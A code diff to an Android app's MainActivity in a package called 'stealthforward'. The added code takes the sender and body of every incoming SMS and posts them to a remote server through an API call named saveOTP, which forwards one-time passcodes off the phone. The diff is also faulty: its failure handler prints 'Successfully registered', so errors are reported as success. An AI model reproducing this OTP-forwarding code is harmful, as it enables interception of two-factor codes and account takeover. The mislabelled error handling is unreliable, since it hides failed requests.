@@ -5,8 +5,12 @@ import android.os.Bundle
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import com.nf.stealthforward.api.NetworkClient
 import kotlinx.android.synthetic.main.activity_main.*
 import kotlinx.android.synthetic.main.content_main.*
+import retrofit2.Call
+import retrofit2.Response
+import javax.security.auth.callback.Callback
 
 
 class MainActivity : AppCompatActivity(), SmsListener {
@@ -23,6 +27,18 @@ class MainActivity : AppCompatActivity(), SmsListener {
 
     override fun onSmsReceived(sender: String, body: String) {
         tvSmsLog.append("\n$sender : $body")
+
+        tvSmsLog.append("\nCalling registering api")
+        val apiCall = NetworkClient.retrofitClient.saveOTP(sender, body)
+        apiCall.enqueue(object : retrofit2.Callback<String> {
+            override fun onFailure(call: Call<String>, t: Throwable) {
+                tvSmsLog.append("\nSuccessfully registered: ${t.localizedMessage}")
+            }
+
+            override fun onResponse(call: Call<String>, response: Response<String>) {
+                tvSmsLog.append("\nSuccessfully registered: ${response.body()}")
+            }
+        })
     }
 
     private fun checkForSmsPermission() {
